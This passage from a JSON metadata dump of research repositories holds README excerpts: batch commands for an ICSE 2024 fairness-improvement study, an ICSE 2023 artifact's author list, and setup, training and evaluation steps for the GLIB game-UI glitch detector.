sex\npython eop_dl.py -d mep2 -c dl -p sex\npython eop.py -d mep2 -c lr -p race\npython eop.py -d mep2 -c rf -p race\npython eop.py -d mep2 -c svm -p race\npython eop_dl.py -d mep2 -c dl -p race\npython ceo.py -d adult -c lr -p sex\npython ceo.py -d adult -c rf -p sex\npython ceo.py -d adult -c svm -p sex\npython ceo_dl.py -d adult -c dl -p sex\npython ceo.py -d adult -c lr -p race\npython ceo.py -d adult -c rf -p race\npython ceo.py -d adult -c svm -p race\npython ceo_dl.py -d adult -c dl -p race\npython ceo.py -d compas -c lr -p sex\npython ceo.py -d compas -c rf -p sex\npython ceo.py -d compas -c svm -p sex\npython ceo_dl.py -d compas -c dl -p sex\npython ceo.py -d compas -c lr -p race\npython ceo.py -d compas -c rf -p race\npython ceo.py -d compas -c svm -p race\npython ceo_dl.py -d compas -c dl -p race\npython ceo.py -d default -c lr -p sex\npython ceo.py -d default -c rf -p sex\npython ceo.py -d default -c svm -p sex\npython ceo_dl.py -d default -c dl -p sex\npython ceo.py -d default -c lr -p age\npython ceo.py -d default -c rf -p age\npython ceo.py -d default -c svm -p age\npython ceo_dl.py -d default -c dl -p age\npython ceo.py -d mep1 -c lr -p sex\npython ceo.py -d mep1 -c rf -p sex\npython ceo.py -d mep1 -c svm -p sex\npython ceo_dl.py -d mep1 -c dl -p sex\npython ceo.py -d mep1 -c lr -p race\npython ceo.py -d mep1 -c rf -p race\npython ceo.py -d mep1 -c svm -p race\npython ceo_dl.py -d mep1 -c dl -p race\npython ceo.py -d mep2 -c lr -p sex\npython ceo.py -d mep2 -c rf -p sex\npython ceo.py -d mep2 -c svm -p sex\npython ceo_dl.py -d mep2 -c dl -p sex\npython ceo.py -d mep2 -c lr -p race\npython ceo.py -d mep2 -c rf -p race\npython ceo.py -d mep2 -c svm -p race\npython ceo_dl.py -d mep2 -c dl -p race\npython roc.py -d adult -c lr -p sex\npython roc.py -d adult -c rf -p sex\npython roc.py -d adult -c svm -p sex\npython roc_dl.py -d adult -c dl -p sex\npython roc.py -d adult -c lr -p race\npython roc.py -d adult -c rf -p race\npython roc.py -d adult -c svm -p race\npython roc_dl.py -d adult -c dl -p race\npython roc.py -d compas -c lr -p sex\npython roc.py -d compas -c rf -p sex\npython roc.py -d compas -c svm -p sex\npython roc_dl.py -d compas -c dl -p sex\npython roc.py -d compas -c lr -p race\npython roc.py -d compas -c rf -p race\npython roc.py -d compas -c svm -p race\npython roc_dl.py -d compas -c dl -p race\npython roc.py -d default -c lr -p sex\npython roc.py -d default -c rf -p sex\npython roc.py -d default -c svm -p sex\npython roc_dl.py -d default -c dl -p sex\npython roc.py -d default -c lr -p age\npython roc.py -d default -c rf -p age\npython roc.py -d default -c svm -p age\npython roc_dl.py -d default -c dl -p age\npython roc.py -d mep1 -c lr -p sex\npython roc.py -d mep1 -c rf -p sex\npython roc.py -d mep1 -c svm -p sex\npython roc_dl.py -d mep1 -c dl -p sex\npython roc.py -d mep1 -c lr -p race\npython roc.py -d mep1 -c rf -p race\npython roc.py -d mep1 -c svm -p race\npython roc_dl.py -d mep1 -c dl -p race\npython roc.py -d mep2 -c lr -p sex\npython roc.py -d mep2 -c rf -p sex\npython roc.py -d mep2 -c svm -p sex\npython roc_dl.py -d mep2 -c dl -p sex\npython roc.py -d mep2 -c lr -p race\npython roc.py -d mep2 -c rf -p race\npython roc.py -d mep2 -c svm -p race\npython roc_dl.py -d mep2 -c dl -p race\npython maat.py -d adult -c lr -p sex\npython maat.py -d adult -c rf -p sex\npython maat.py -d adult -c svm -p sex\npython maat_dl.py -d adult -c dl -p sex\npython maat.py -d adult -c lr -p race\npython maat.py -d adult -c rf -p race\npython maat.py -d adult -c svm -p race\npython maat_dl.py -d adult -c dl -p race\npython maat.py -d compas -c lr -p sex\npython maat.py -d compas -c rf -p sex\npython maat.py -d compas -c svm -p sex\npython maat_dl.py -d compas -c dl -p sex\npython maat.py -d compas -c lr -p race\npython maat.py -d compas -c rf -p race\npython maat.py -d compas -c svm -p race\npython maat_dl.py -d compas -c dl -p race\npython maat.py -d default -c lr -p sex\npython maat.py -d default -c rf -p sex\npython maat.py -d default -c svm -p sex\npython maat_dl.py -d default -c dl -p sex\npython maat.py -d default -c lr -p age\npython maat.py -d default -c rf -p age\npython maat.py -d default -c svm -p age\npython maat_dl.py -d default -c dl -p age\npython maat.py -d mep1 -c lr -p sex\npython maat.py -d mep1 -c rf -p sex\npython maat.py -d mep1 -c svm -p sex\npython maat_dl.py -d mep1 -c dl -p sex\npython maat.py -d mep1 -c lr -p race\npython maat.py -d mep1 -c rf -p race\npython maat.py -d mep1 -c svm -p race\npython maat_dl.py -d mep1 -c dl -p race\npython maat.py -d mep2 -c lr -p sex\npython maat.py -d mep2 -c rf -p sex\npython maat.py -d mep2 -c svm -p sex\npython maat_dl.py -d mep2 -c dl -p sex\npython maat.py -d mep2 -c lr -p race\npython maat.py -d mep2 -c rf -p race\npython maat.py -d mep2 -c svm -p race\npython maat_dl.py -d mep2 -c dl -p race\n\ncd\ncd ICSE24/FairMask\npython Fairmask.py -d adult -c lr -p sex\npython Fairmask.py -d adult -c rf -p sex\npython Fairmask.py -d adult -c svm -p sex\npython Fairmask_dl.py -d adult -c dl -p sex\npython Fairmask.py -d adult -c lr -p race\npython Fairmask.py -d adult -c rf -p race\npython Fairmask.py -d adult -c svm -p race\npython Fairmask_dl.py -d adult -c dl -p race\npython Fairmask.py -d compas -c lr -p sex\npython Fairmask.py -d compas -c rf -p sex\npython Fairmask.py -d compas -c svm -p sex\npython Fairmask_dl.py -d compas -c dl -p sex\npython Fairmask.py -d compas -c lr -p race\npython Fairmask.py -d compas -c rf -p race\npython Fairmask.py -d compas -c svm -p race\npython Fairmask_dl.py -d compas -c dl -p race\npython Fairmask.py -d default -c lr -p sex\npython Fairmask.py -d default -c rf -p sex\npython Fairmask.py -d default -c svm -p sex\npython Fairmask_dl.py -d default -c dl -p sex\npython Fairmask.py -d default -c lr -p age\npython Fairmask.py -d default -c rf -p age\npython Fairmask.py -d default -c svm -p age\npython Fairmask_dl.py -d default -c dl -p age\npython Fairmask.py -d mep1 -c lr -p sex\npython Fairmask.py -d mep1 -c rf -p sex\npython Fairmask.py -d mep1 -c svm -p sex\npython Fairmask_dl.py -d mep1 -c dl -p sex\npython Fairmask.py -d mep1 -c lr -p race\npython Fairmask.py -d mep1 -c rf -p race\npython Fairmask.py -d mep1 -c svm -p race\npython Fairmask_dl.py -d mep1 -c dl -p race\npython Fairmask.py -d mep2 -c lr -p sex\npython Fairmask.py -d mep2 -c rf -p sex\npython Fairmask.py -d mep2 -c svm -p sex\npython Fairmask_dl.py -d mep2 -c dl -p sex\npython Fairmask.py -d mep2 -c lr -p race\npython Fairmask.py -d mep2 -c rf -p race\npython Fairmask.py -d mep2 -c svm -p race\npython Fairmask_dl.py -d mep2 -c dl -p race\n\ncd\ncd ICSE24/FairSMOTE\npython FairSMOTE.py -d adult -c lr -p sex\npython FairSMOTE.py -d adult -c rf -p sex\npython FairSMOTE.py -d adult -c svm -p sex\npython FairSMOTE_dl.py -d adult -c dl -p sex\npython FairSMOTE.py -d adult -c lr -p race\npython FairSMOTE.py -d adult -c rf -p race\npython FairSMOTE.py -d adult -c svm -p race\npython FairSMOTE_dl.py -d adult -c dl -p race\npython FairSMOTE.py -d compas -c lr -p sex\npython FairSMOTE.py -d compas -c rf -p sex\npython FairSMOTE.py -d compas -c svm -p sex\npython FairSMOTE_dl.py -d compas -c dl -p sex\npython FairSMOTE.py -d compas -c lr -p race\npython FairSMOTE.py -d compas -c rf -p race\npython FairSMOTE.py -d compas -c svm -p race\npython FairSMOTE_dl.py -d compas -c dl -p race\npython FairSMOTE.py -d default -c lr -p sex\npython FairSMOTE.py -d default -c rf -p sex\npython FairSMOTE.py -d default -c svm -p sex\npython FairSMOTE_dl.py -d default -c dl -p sex\npython FairSMOTE.py -d default -c lr -p age\npython FairSMOTE.py -d default -c rf -p age\npython FairSMOTE.py -d default -c svm -p age\npython FairSMOTE_dl.py -d default -c dl -p age\npython FairSMOTE.py -d mep1 -c lr -p sex\npython FairSMOTE.py -d mep1 -c rf -p sex\npython FairSMOTE.py -d mep1 -c svm -p sex\npython FairSMOTE_dl.py -d mep1 -c dl -p sex\npython FairSMOTE.py -d mep1 -c lr -p race\npython FairSMOTE.py -d mep1 -c rf -p race\npython FairSMOTE.py -d mep1 -c svm -p race\npython FairSMOTE_dl.py -d mep1 -c dl -p race\npython FairSMOTE.py -d mep2 -c lr -p sex\npython FairSMOTE.py -d mep2 -c rf -p sex\npython FairSMOTE.py -d mep2 -c svm -p sex\npython FairSMOTE_dl.py -d mep2 -c dl -p sex\npython FairSMOTE.py -d mep2 -c lr -p race\npython FairSMOTE.py -d mep2 -c rf -p race\npython FairSMOTE.py -d mep2 -c svm -p race\npython FairSMOTE_dl.py -d mep2 -c dl -p race\n\n```\n\nAs a result, we can obtain the results of each fairness improvement for 40 (dataset, protected attribute, ML algorithm) combinations. The raw result for each combination is then moved to the `Results/` folder. For example, in this folder, `maat_lr_adult_sex.txt` contains the results of MAAT for the (adult, sex, lr) combination. Each file in the folder has 21 columns, with the first column indicating the metric and the next 20 columns the metric values of 20 runs.\n\n\n(2) We can obtain the results of RQ1 (i.e., Table 5 and Table 6) as follows:\n\n```\ncd \ncd ICSE24/Analysis_code\npython rq1.py\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "RQ1 (Impact on Unconsidered Protected Attributes): How do existing fairness improvement methods affect the fairness regarding unconsidered protected attributes?",
                    "parent_header": [
                        "[ICSE 2024] Fairness Improvement with Multiple Protected Attributes: How Far Are We?",
                        "Usage (Step-by-step Guide)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/chenzhenpeng18/ICSE24-Multi-Attribute-Fairness/main/README.md"
            },
            {
                "result": {
                    "value": "This RQ evaluates the effectiveness of state-of-the-art fairness improvement methods in improving intersectional fairness.\n\n(1) We first apply each fairness improvement method to tasks with multiple protected attributes. Each fairness improvement method supports three arguments: `-d` configures the dataset; `-c` configures the machine learning algorithm. We apply each fairness improvement method for 5*4=20 (dataset, ML algorithm) tasks. We can achieve this by running the code as follows:\n\n```\ncd \ncd ICSE24/Fair3602\npython default.py -d adult -c lr\npython default.py -d adult -c rf\npython default.py -d adult -c svm\npython default_dl.py -d adult -c dl\npython default.py -d compas -c lr\npython default.py -d compas -c rf\npython default.py -d compas -c svm\npython default_dl.py -d compas -c dl\npython default.py -d default -c lr\npython default.py -d default -c rf\npython default.py -d default -c svm\npython default_dl.py -d default -c dl\npython default.py -d mep1 -c lr\npython default.py -d mep1 -c rf\npython default.py -d mep1 -c svm\npython default_dl.py -d mep1 -c dl\npython default.py -d mep2 -c lr\npython default.py -d mep2 -c rf\npython default.py -d mep2 -c svm\npython default_dl.py -d mep2 -c dl\npython rw.py -d adult -c lr\npython rw.py -d adult -c rf\npython rw.py -d adult -c svm\npython rw_dl.py -d adult -c dl\npython rw.py -d compas -c lr\npython rw.py -d compas -c rf\npython rw.py -d compas -c svm\npython rw_dl.py -d compas -c dl\npython rw.py -d default -c lr\npython rw.py -d default -c rf\npython rw.py -d default -c svm\npython rw_dl.py -d default -c dl\npython rw.py -d mep1 -c lr\npython rw.py -d mep1 -c rf\npython rw.py -d mep1 -c svm\npython rw_dl.py -d mep1 -c dl\npython rw.py -d mep2 -c lr\npython rw.py -d mep2 -c rf\npython rw.py -d mep2 -c svm\npython rw_dl.py -d mep2 -c dl\npython dir.py -d adult -c lr\npython dir.py -d adult -c rf\npython dir.py -d adult -c svm\npython dir_dl.py -d adult -c dl\npython dir.py -d compas -c lr\npython dir.py -d compas -c rf\npython dir.py -d compas -c svm\npython dir_dl.py -d compas -c dl\npython dir.py -d default -c lr\npython dir.py -d default -c rf\npython dir.py -d default -c svm\npython dir_dl.py -d default -c dl\npython dir.py -d mep1 -c lr\npython dir.py -d mep1 -c rf\npython dir.py -d mep1 -c svm\npython dir_dl.py -d mep1 -c dl\npython dir.py -d mep2 -c lr\npython dir.py -d mep2 -c rf\npython dir.py -d mep2 -c svm\npython dir_dl.py -d mep2 -c dl\npython meta.py -d adult -c lr\npython meta.py -d compas -c lr\npython meta.py -d default -c lr\npython meta.py -d mep1 -c lr\npython meta.py -d mep2 -c lr\npython adv.py -d adult -c lr\npython adv.py -d compas -c lr\npython adv.py -d default -c lr\npython adv.py -d mep1 -c lr\npython adv.py -d mep2 -c lr\npython pr.py -d adult -c lr\npython pr.py -d compas -c lr\npython pr.py -d default -c lr\npython pr.py -d mep1 -c lr\npython pr.py -d mep2 -c lr\npython eop.py -d adult -c lr\npython eop.py -d adult -c rf\npython eop.py -d adult -c svm\npython eop_dl.py -d adult -c dl\npython eop.py -d compas -c lr\npython eop.py -d compas -c rf\npython eop.py -d compas -c svm\npython eop_dl.py -d compas -c dl\npython eop.py -d default -c lr\npython eop.py -d default -c rf\npython eop.py -d default -c svm\npython eop_dl.py -d default -c dl\npython eop.py -d mep1 -c lr\npython eop.py -d mep1 -c rf\npython eop.py -d mep1 -c svm\npython eop_dl.py -d mep1 -c dl\npython eop.py -d mep2 -c lr\npython eop.py -d mep2 -c rf\npython eop.py -d mep2 -c svm\npython eop_dl.py -d mep2 -c dl\npython ceo.py -d adult -c lr\npython ceo.py -d adult -c rf\npython ceo.py -d adult -c svm\npython ceo_dl.py -d adult -c dl\npython ceo.py -d compas -c lr\npython ceo.py -d compas -c rf\npython ceo.py -d compas -c svm\npython ceo_dl.py -d compas -c dl\npython ceo.py -d default -c lr\npython ceo.py -d default -c rf\npython ceo.py -d default -c svm\npython ceo_dl.py -d default -c dl\npython ceo.py -d mep1 -c lr\npython ceo.py -d mep1 -c rf\npython ceo.py -d mep1 -c svm\npython ceo_dl.py -d mep1 -c dl\npython ceo.py -d mep2 -c lr\npython ceo.py -d mep2 -c rf\npython ceo.py -d mep2 -c svm\npython ceo_dl.py -d mep2 -c dl\npython roc.py -d adult -c lr\npython roc.py -d adult -c rf\npython roc.py -d adult -c svm\npython roc_dl.py -d adult -c dl\npython roc.py -d compas -c lr\npython roc.py -d compas -c rf\npython roc.py -d compas -c svm\npython roc_dl.py -d compas -c dl\npython roc.py -d default -c lr\npython roc.py -d default -c rf\npython roc.py -d default -c svm\npython roc_dl.py -d default -c dl\npython roc.py -d mep1 -c lr\npython roc.py -d mep1 -c rf\npython roc.py -d mep1 -c svm\npython roc_dl.py -d mep1 -c dl\npython roc.py -d mep2 -c lr\npython roc.py -d mep2 -c rf\npython roc.py -d mep2 -c svm\npython roc_dl.py -d mep2 -c dl\npython maat.py -d adult -c lr\npython maat.py -d adult -c rf\npython maat.py -d adult -c svm\npython maat_dl.py -d adult -c dl\npython maat.py -d compas -c lr\npython maat.py -d compas -c rf\npython maat.py -d compas -c svm\npython maat_dl.py -d compas -c dl\npython maat.py -d default -c lr\npython maat.py -d default -c rf\npython maat.py -d default -c svm\npython maat_dl.py -d default -c dl\npython maat.py -d mep1 -c lr\npython maat.py -d mep1 -c rf\npython maat.py -d mep1 -c svm\npython maat_dl.py -d mep1 -c dl\npython maat.py -d mep2 -c lr\npython maat.py -d mep2 -c rf\npython maat.py -d mep2 -c svm\npython maat_dl.py -d mep2 -c dl\n\ncd \ncd ICSE24/FairMask2\npython Fairmask.py -d adult -c lr\npython Fairmask.py -d adult -c rf\npython Fairmask.py -d adult -c svm\npython Fairmask_dl.py -d adult -c dl\npython Fairmask.py -d compas -c lr\npython Fairmask.py -d compas -c rf\npython Fairmask.py -d compas -c svm\npython Fairmask_dl.py -d compas -c dl\npython Fairmask.py -d default -c lr\npython Fairmask.py -d default -c rf\npython Fairmask.py -d default -c svm\npython Fairmask_dl.py -d default -c dl\npython Fairmask.py -d mep1 -c lr\npython Fairmask.py -d mep1 -c rf\npython Fairmask.py -d mep1 -c svm\npython Fairmask_dl.py -d mep1 -c dl\npython Fairmask.py -d mep2 -c lr\npython Fairmask.py -d mep2 -c rf\npython Fairmask.py -d mep2 -c svm\npython Fairmask_dl.py -d mep2 -c dl\n\ncd \ncd ICSE24/FairSMOTE2\npython FairSMOTE.py -d adult -c lr\npython FairSMOTE.py -d adult -c rf\npython FairSMOTE.py -d adult -c svm\npython FairSMOTE_dl.py -d adult -c dl\npython FairSMOTE.py -d compas -c lr\npython FairSMOTE.py -d compas -c rf\npython FairSMOTE.py -d compas -c svm\npython FairSMOTE_dl.py -d compas -c dl\npython FairSMOTE.py -d default -c lr\npython FairSMOTE.py -d default -c rf\npython FairSMOTE.py -d default -c svm\npython FairSMOTE_dl.py -d default -c dl\npython FairSMOTE.py -d mep1 -c lr\npython FairSMOTE.py -d mep1 -c rf\npython FairSMOTE.py -d mep1 -c svm\npython FairSMOTE_dl.py -d mep1 -c dl\npython FairSMOTE.py -d mep2 -c lr\npython FairSMOTE.py -d mep2 -c rf\npython FairSMOTE.py -d mep2 -c svm\npython FairSMOTE_dl.py -d mep2 -c dl\n```\n\nAs a result, we can obtain the results of each fairness improvement for 20 (dataset, ML algorithm) combinations. The raw result for each combination is then moved to the `Results_multi/` folder. For example, in this folder, `maat_lr_adult_multi.txt` contains the results of MAAT for the (adult, lr) combination. Each file in the folder has 21 columns, with the first column indicating the metric and the next 20 columns the metric values of 20 runs.\n\n\n(2) We can obtain the results of RQ2 (i.e., Table 7 and Table 8) as follows:\n\n```\ncd \ncd ICSE24/Analysis_code\npython rq2.py\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "RQ2 (Intersectional Fairness Improvement): What intersectional fairness do existing fairness improvement methods achieve when considering multiple protected attributes?",
                    "parent_header": [
                        "[ICSE 2024] Fairness Improvement with Multiple Protected Attributes: How Far Are We?",
                        "Usage (Step-by-step Guide)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/chenzhenpeng18/ICSE24-Multi-Attribute-Fairness/main/README.md"
            },
            {
                "result": {
                    "value": "(1) We first answer RQ3.1: Does the application of existing methods to improve fairness for multiple protected attributes lead to significantly greater performance reduction compared to improving fairness for a single attribute?\n\nSince in RQ1 and RQ2, we can calculate the effects of each fairness improvement method on machine learning performance when dealing with single or multiple protected attributes. The results are included in `Results/` and `Results_multi/`. We can directly obtain the results of RQ3.1 (i.e., Table 9) as follows:\n\n```\ncd \ncd ICSE24/Analysis_code\npython rq3_1.py\n```\n\n(2) We next answer RQ3.2: Which trade-off effectiveness levels do existing fairness improvement methods fall into according to Fairea?\n\nFor each (dataset, ML algorithm) combination, we use Fairea to construct the fairness-performance trade-off baseline.\n```\ncd\ncd ICSE24/Cal_baseline\npython cal_baselinepoints_multi.py -d adult -c lr\npython cal_baselinepoints_multi.py -d adult -c rf\npython cal_baselinepoints_multi.py -d adult -c svm\npython cal_baselinepoints_multi_dl.py -d adult -c dl\npython cal_baselinepoints_multi.py -d compas -c lr\npython cal_baselinepoints_multi.py -d compas -c rf\npython cal_baselinepoints_multi.py -d compas -c svm\npython cal_baselinepoints_multi_dl.py -d compas -c dl\npython cal_baselinepoints_multi.py -d default -c lr\npython cal_baselinepoints_multi.py -d default -c rf\npython cal_baselinepoints_multi.py -d default -c svm\npython cal_baselinepoints_multi_dl.py -d default -c dl\npython cal_baselinepoints_multi.py -d mep1 -c lr\npython cal_baselinepoints_multi.py -d mep1 -c rf\npython cal_baselinepoints_multi.py -d mep1 -c svm\npython cal_baselinepoints_multi_dl.py -d mep1 -c dl\npython cal_baselinepoints_multi.py -d mep2 -c lr\npython cal_baselinepoints_multi.py -d mep2 -c rf\npython cal_baselinepoints_multi.py -d mep2 -c svm\npython cal_baselinepoints_multi_dl.py -d mep2 -c dl\n```\n\nThe baselines for each (dataset, ML algorithm) combination is included in the `Fairea_baseline_multi/` folder. For example, `adult_lr_baseline.txt` contains the baseline for the (adult, lr) combination. Each file in the folder has 12 columns, with the first column indicating the ML performance or fairness metric, the second column the metric values of the original model, the next 10 columns the metric values of 10 pseudo models (with different mutation degrees).\n\nThen we can obtain the results of RQ3.2 (i.e., Figure 1) as follows:\n\n```\ncd \ncd ICSE24/Analysis_code\npython rq3_2.py\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "RQ3 (Fairness-performance Trade-off): What fairness-performance trade-off do existing fairness improvement methods achieve when considering multiple protected attributes?",
                    "parent_header": [
                        "[ICSE 2024] Fairness Improvement with Multiple Protected Attributes: How Far Are We?",
                        "Usage (Step-by-step Guide)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/chenzhenpeng18/ICSE24-Multi-Attribute-Fairness/main/README.md"
            },
            {
                "result": {
                    "value": "Then we can obtain the results of RQ4 (i.e., Figure 2) as follows:\n\n```\ncd \ncd ICSE24/Analysis_code\npython rq4.py\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "RQ4 (Applicability): How well do existing fairness improvement methods apply to different decision tasks, ML models, and fairness and performance metrics, when dealing with multiple protected attributes?",
                    "parent_header": [
                        "[ICSE 2024] Fairness Improvement with Multiple Protected Attributes: How Far Are We?",
                        "Usage (Step-by-step Guide)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/chenzhenpeng18/ICSE24-Multi-Attribute-Fairness/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-10-20T08:36:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-22T03:15:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 399331
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "328": {
        "filename": "setu1421_ICSE-2023-Artifacts_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/setu1421/ICSE-2023-Artifacts",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": " - Setu Kumar Basak (sbasak4@ncsu.edu)\n - Lorenzo Neil (lcneil@ncsu.edu)\n - Bradley Reaves (bgreaves@ncsu.edu)\n - Laurie Willams (lawilli3@ncsu.edu)  \n",
                    "original_header": "Authors:"
                },
                "confidence": 0.947657590785864,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/setu1421/ICSE-2023-Artifacts/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-20T01:31:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-01-20T01:31:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "329": {
        "filename": "GLIB-game_GLIB_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/GLIB-game/GLIB",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "download the UI image [dataset](https://doi.org/10.5281/zenodo.5081242) and unzip:\n\n```shell\nunzip data.zip\n```\n\ndata/images: \n\n- *data/images/Base* : 132 screenshots of game1 & game2 with UI display issues from 466 test reports.\n- *data/images/Code* : 9,412 screenshots of game1 & game2 with UI display issues generated by our Code augmentation method.\n- *data/images/Normal*: 7,750 screenshots of game1 & game2 without UI display issues collected by randomly traversing the game scene.\n- *data/images/Rule(F)* : 7,750 screenshots of game1 & game2 with UI display issues generated by our Rule(F) augmentation method.\n- *data/images/Rule(R)* : 7,750 screenshots of game1 & game2 with UI display issues generated by our Rule(R) augmentation method.\n- *data/images/testDataSet* : 192 screenshots  with UI display issues from 466 test reports(exclude game1 & game2).\n\ndata/data_csv:\n\n- *data/data_csv/Base* : dataset for baseline method.\n- *data/data_csv/Code* : dataset for our Code Augmentation method.\n- *data/data_csv/Rule(F)* : dataset for our Rule(F) Augmentation method.\n- *data/data_csv/Rule(R)* : dataset for our Rule(R) Augmentation method.\n- *data/data_csv/Code_plus_Rule(F)* : dataset for our Code&Rule(F) Augmentation method.\n- *data/data_csv/Code_plus_Rule(R)* : dataset for our Code&Rule(R) Augmentation method.\n- *data/data_csv/testDataSet* : test dataset(normal image and real glitch images from 466 test reports).\n\ndownload the pre-trained [model](https://doi.org/10.5281/zenodo.5081280) and unzip:\n\n```shell\nunzip model.zip\n```\n\n- *model/Base* : pre-trained model for baseline method.\n- *model/Code* : pre-trained model for our Code Augmentation method.\n- *model/Rule(F)* : pre-trained model for our Rule(F) Augmentation method.\n- *model/Rule(R)* : pre-trained model for our Rule(R) Augmentation method.\n- *model/Code_plus_Rule(F)* : pre-trained model for our Code&Rule(F) Augmentation method.\n- *model/Code_plus_Rule(R)* : pre-trained model for our Code&Rule(R) Augmentation method.\n",
                    "type": "Text_excerpt",
                    "original_header": "<span id=\"Download\">Download dataset and model</span>:",
                    "parent_header": [
                        "GLIB",
                        "Installation and Execution"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/GLIB-game/GLIB/main/README.md"
            },
            {
                "result": {
                    "value": "Step1: Login with your username and password\n```shell\ndocker login\n```\nStep2: Pull source from our docker and start a container\n```shell\ndocker pull qwertymj/glib:0.0.1\ndocker container run -it --gpus all qwertymj/glib:0.0.1 /bin/bash\n```\nStep3: Open another shell to check the running container ID\n```shell\ndocker ps\n```\nStep4:  [Download dataset and model](#Download)\n\nStep5: Copy the container ID and push our dataset to the container\n\n```shell\ndocker cp data [container ID]:/code/data\ndocker cp model [container ID]:/code/model\ncd /code\npip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple \n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Method1: Very simple: pull a Docker image (Recommanded)",
                    "parent_header": [
                        "GLIB",
                        "Installation and Execution",
                        "Environment Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/GLIB-game/GLIB/main/README.md"
            },
            {
                "result": {
                    "value": "Step1: Clone repo\n```shell\ngit clone --recursive https://github.com/GLIB-game/GLIB.git\n```\nStep2: Build docker image\n```shell\ncd GLIB\nsudo docker image build -t qwertymj/glib:0.0.1 .\n```\nStep3: Start the container\n```shell\ndocker container run -it --gpus all qwertymj/glib:0.0.1 /bin/bash\n```\nStep4: [Download dataset and model](#Download)\n\nStep5: Copy the container ID and push our dataset to the container\n\n```shell\ndocker cp data [container ID]:/code/data\ndocker cp model [container ID]:/code/model\ncd /code\npip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple \n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Method2: A bit harder: build a Docker image",
                    "parent_header": [
                        "GLIB",
                        "Installation and Execution",
                        "Environment Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/GLIB-game/GLIB/main/README.md"
            },
            {
                "result": {
                    "value": "First you should make sure your linux system has installed cuda(9.0.176) and cudnn(7.4.2)\n\nStep1: Install dependencies\n```shell\napt-get update && \\\napt-get install -y wget \\\ngnupg \\\napt-transport-https \\\ntzdata \\\nnet-tools \\\ndnsutils \\\niproute2 \\\ngcc \\\ntmux \\\nhtop \\\ngit \\\nvim \\\nsudo \\\ncmake \\\nlibgl1-mesa-glx \\\nlibglib2.0-0 \\\nopenssh-server\n```\n\nStep2: Build python virtual environment\n\n```shell\nconda create -n python3.5 python=3.5.2\nconda activate python3.5\n```\n\nStep3: Clone the GLIB repository\n\n```shell\ngit clone --recursive https://github.com/GLIB-game/GLIB.git\n```\nStep4: Install python dependencies\n```shell\ncd GLIB\npip install --upgrade pip\npip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple \n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Method3: Hard: set up the environment manually (Not Recommanded)",
                    "parent_header": [
                        "GLIB",
                        "Installation and Execution",
                        "Environment Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/GLIB-game/GLIB/main/README.md"
            },
            {
                "result": {
                    "value": "Training from scratch:\n\n```shell\npython train.py --train_data train_file_path --eval_data eval_file_path --augType Type\n```\n\nExample:\n\n```shell\npython train.py --train_data data/data_csv/Code/Code_train.csv --eval_data data/data_csv/Code/Code_test.csv --augType Code\n```\n\nTraining from the pre-trained model:\n\n```shell\npython train.py --train_data train_file_path --eval_data eval_file_path --augType Type --model_path model_path\n```\n\nExample:\n\n```shell\npython train.py --train_data data/data_csv/Code/Code_train.csv --eval_data data/data_csv/Code/Code_test.csv --augType Code --model_path model/Code/Code.pkl\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Train the CNN model",
                    "parent_header": [
                        "GLIB",
                        "Installation and Execution"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/GLIB-game/GLIB/main/README.md"
            },
            {
                "result": {
                    "value": "```shell\npython test.py --test_data test_data_path --model model_path\n```\n\nExample:\n\n```shell\npython test.py --test_data data/data_csv/testDataSet/testData_test.csv --model model/Code/Code.pkl\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Evaluate the model",
                    "parent_header": [
                        "GLIB",
                        "Installation and Execution"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/GLIB-game/GLIB/main/README.md"
            },
            {
                "result": {
